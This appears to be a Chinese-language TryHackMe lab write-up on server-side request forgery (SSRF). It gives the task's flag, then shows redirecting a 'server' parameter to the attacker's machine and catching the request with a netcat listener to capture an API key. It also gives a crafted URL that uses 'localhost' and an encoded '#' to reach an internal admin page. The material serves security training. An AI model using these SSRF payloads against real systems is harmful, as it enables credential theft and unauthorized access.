     ![](../images/Pasted%20image%2020240803174609.png)
- 使用SSRF，使应用程序将请求发送到您的AttackBox而不是安全文件存储。截获的请求中是否有API密钥？ **答案**：`THM{Hello_Im_just_an_API_key}`
    - 在burpsuite 中，将请求包头中的`server`地址改为自己的主机地址`server=10.10.115.178:8087`
        ![](../images/Pasted%20image%2020240803175322.png)
    - `nc` 命令进行相应的本地端口监听：`nc -lvp 8087` 
        ![](../images/Pasted%20image%2020240803175413.png)
    - burpsuite 发送请求
     ![](../images/Pasted%20image%2020240803175618.png)
    - 获取到flag
        ![](../images/Pasted%20image%2020240803175642.png)
    
- 有一种方法可以使用SSRF访问网站
    参考：[https://medium.com/@corybantic/tryhackme-owasp-top-10-2021-writeup-159ccfadb4d7](https://medium.com/@corybantic/tryhackme-owasp-top-10-2021-writeup-159ccfadb4d7)
    ```bash
    10.10.37.106:8087/download?server=localhost:8087/admin%23&id=75482342
    ```
    ![](../images/Pasted%20image%2020240803182344.png)